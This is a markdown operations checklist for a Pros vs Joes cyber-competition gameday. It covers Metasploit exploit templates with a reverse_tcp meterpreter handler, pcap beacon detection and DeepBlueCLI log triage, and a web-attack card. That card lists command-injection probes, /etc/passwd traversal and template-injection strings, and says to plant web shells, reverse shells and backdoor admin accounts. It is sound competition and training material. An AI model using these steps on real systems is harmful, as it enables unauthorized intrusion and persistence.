# PvJ gameday workflows checklist

## Environment and configuration

- **.env present:** Ensure a `.env` file exists at repo root with keys: `AGGREGATE_RANGE`, `TEAM_NAME`, `TEAM_RANGE`, `ATTACK_RANGES`, `LHOST`, `LPORT`, `SCOREBOT_URL`, `DNS_SERVER`, `RHOSTS`, `RPORT`.
    
- **Source variables:** Load before sessions.
    
    - `set -a; . ./.env; set +a`
        
- **Target switching:** Use `set_target.sh` to set team and targets.
    
    - `./set_target.sh <TeamName> [RHOSTS] [RPORT]`
        
- **Attack ranges auto-set:** Confirm `ATTACK_RANGES` updates to all other teams when switching.
    
- **Sed delimiter fix:** Verify `set_target.sh` uses `|` in `sed` substitutions to avoid CIDR `/` issues.
    
- **Status check:** Optionally add a `status` subcommand to print current `.env` values for quick verification.
    

## Exploit launcher library (Metasploit)

- **RC templates:** Store `.rc` files (Samba, Tomcat, Shellshock, ProFTPD, Usermap) with placeholders for `RHOSTS`, `LHOST`, `LPORT`.
    
- **Payload names:** Use symbolic payload names in Metasploit (`linux/x86/meterpreter/reverse_tcp`, etc.), do not set payload to a file path.
    
- **Run modules:** Launch with:
    
    - `msfconsole -r exploit_samba.rc`
        
- **Sessions management:** After run:
    
    - `sessions -l` then `sessions -i <ID>`
        
- **Optional msfvenom artifacts:** Generate only if needed and serve separately (HTTP/SCP), with a matching handler:
    
    - `use exploit/multi/handler`
        
    - `set PAYLOAD <payload>`
        
    - `set LHOST $LHOST; set LPORT $LPORT; exploit`
        
- **Null byte check:** If seeing “path name contains null byte,” inspect any script-provided paths with `repr`/`xxd` and strip `\x00` from variables before use.
    

## Beacon detection and pcaps

- **pcap_beacons.sh role:** Front-end triage using `tshark` to extract candidate beacon flows (IPs/URIs/counts).
    
- **beacon_detect.py role:** Logic/correlation engine that matches candidates to canary patterns and your `registry.csv`, outputs structured results.
    
- **beacon_detect.sh fix:** Remove missing deps or add a minimal `safe()` function; avoid sourcing non-existent `./libs/helpers.sh`.
    
    - Minimal standalone:
        
        - `tshark -r "$PCAP" -T fields -e ip.dst | sort | uniq -c | sort -nr | head`
            
- **Chained usage:** Preferred pipeline for structured correlation.
    
    - `./pcap_beacons.sh capture.pcap | python3 beacon_detect.py --registry registry.csv`
        
- **Live capture:** On remote, capture then pull back.
    
    - `ssh user@remote 'sudo tcpdump -i eth0 -w /tmp/capture.pcap'`
        
    - `scp user@remote:/tmp/capture.pcap .`
        
- **Remote execution:** If running on remote, ensure dependencies exist or copy scripts over.
    
    - `scp pcap_beacons.sh user@remote:/tmp/; ssh user@remote 'chmod +x /tmp/pcap_beacons.sh && /tmp/pcap_beacons.sh /tmp/capture.pcap'`
        

## DeepBlueCLI on Kali

- **Install prerequisites:** `sudo apt update && sudo apt install -y git powershell`
    
- **Clone and test:** `git clone https://github.com/sans-blue-team/DeepBlueCLI.git && cd DeepBlueCLI && pwsh ./DeepBlue.ps1 -h`
    
- **Analyze evtx:** Export from Windows with `wevtutil epl` and process on Kali.
    
    - `pwsh ./DeepBlue.ps1 ./Security.evtx > deepblue_output.txt`
        
- **Key event IDs:** Focus on 4624/4625 (logons), 4672 (privs), 4720/4722/4723/4724 (accounts), 4728/4732/4756 (groups), 4688 (process), 4697/7045 (service), 4103/4104 (PowerShell).
    
- **Action from findings:** Block offending IPs, disable suspicious accounts, hunt persistence, correlate with beacon registry.
    

## Web app attack workflow (ops card essentials)

- **Recon:** `nmap -sV -p- TARGET`; `whatweb TARGET`; `ffuf -u http://TARGET/FUZZ -w wordlist.txt`; `paramspider TARGET`.
    
- **Auth/session:** `hydra` for form spraying; inspect cookies (`HttpOnly`, `Secure`, `SameSite`); attempt session fixation/replay.
    
- **Injection:** `sqlmap` for SQLi; manual command injection probes (`;id`, `&& whoami`); XSS tests or `dalfox`; template injection (`{{7*7}}`, `${7*7}`).
    
- **Files/objects:** Upload tests (`.php/.jsp/.jpg.php`); traversal (`../../etc/passwd`); deserialization/JWT tampering.
    
- **Access/logic:** IDOR (increment/decrement IDs); unauthorized `/admin`; business logic abuses (skip steps, negative prices).
    
- **Exploit/persist:** Drop web shell or reverse shell; pivot internally; create backdoor admin; tamper plugins/themes.
    
- **Cleanup/report:** Remove artifacts; log vuln, PoC, impact, remediation in registry and handoffs.
    

## Operational hygiene and quick pivots

- **Registry discipline:** Every token drop or detection gets a UUID entry in `registry.csv` with timestamp, host, user, and context.
    
- **Logging:** Centralize tool output in `./logs` with clear filenames (`YYYYMMDD_tool_target.log`).
    
- **Network pivots:** Record and export `ROUTE_SUBNET` when adding routes through sessions.
    
- **DNS/scoring:** Keep `DNS_SERVER` and `SCOREBOT_URL` current; verify resolver reachability before scans and payload callbacks.
    
- **Status snapshot:** Before major actions, print current config:
    
    - `grep -E '^(TEAM_|ATTACK_RANGES|LHOST|LPORT|RHOSTS|RPORT|DNS_SERVER|SCOREBOT_URL)=' .env`